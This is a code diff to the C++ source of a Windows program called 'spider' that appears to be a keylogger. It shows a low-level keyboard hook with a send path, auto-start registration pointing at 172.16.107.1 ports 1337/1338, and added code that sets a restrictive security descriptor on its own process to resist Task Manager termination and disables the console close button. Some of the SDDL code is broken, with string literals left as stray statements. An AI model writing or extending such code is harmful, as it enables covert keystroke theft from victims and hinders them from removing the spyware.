@@ -7,6 +7,8 @@
 #include <cstring>
 #include <cstdint>
 #include <ctime>
+#include <Aclapi.h>
+#include <Sddl.h>
 #include "SpiderPlugin.h"
 #include "MacAddr.h"
 
@@ -208,6 +210,16 @@ namespace spider
 
 	// Register program for automatic startup
 	registerProgram();
+
+	// Prevent executable from being killed via the Task Manager
+	protectTask();
+
+	// Prevent the console from being close
+	{
+	  HWND  hwnd = GetConsoleWindow();
+	  HMENU hmenu = GetSystemMenu(hwnd, FALSE);
+	  EnableMenuItem(hmenu, SC_CLOSE, MF_GRAYED);
+	}
 
 	return true;
       }
@@ -483,7 +495,6 @@ namespace spider
 	    if (send)
 	      {
 		BYTE            KeyState[256];
-		WORD            wBuf;
 		KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT *)lParam);
 		GetKeyboardState(KeyState);
 
@@ -720,6 +731,30 @@ namespace spider
 	    registerForStartup(L"spider", pathToExe.data(),
 	                       L"172.16.107.1 1337 1338");
 	  }
+      }
+
+      bool SpiderPlugin::protectTask() const
+      {
+	HANDLE hProcess =
+	    OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+
+	SECURITY_ATTRIBUTES sa;
+	TCHAR *             szSD = TEXT("D:P");
+	TEXT("(D;OICI;GA;;;BG)"); // Deny access to
+	// built-in guests
+	TEXT("(D;OICI;GA;;;AN)"); // Deny access to
+	// anonymous logon
+
+	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+	sa.bInheritHandle = FALSE;
+
+	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(
+	        szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
+	  return false;
+	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION,
+	                             sa.lpSecurityDescriptor))
+	  return false;
+	return true;
       }
     }
   }
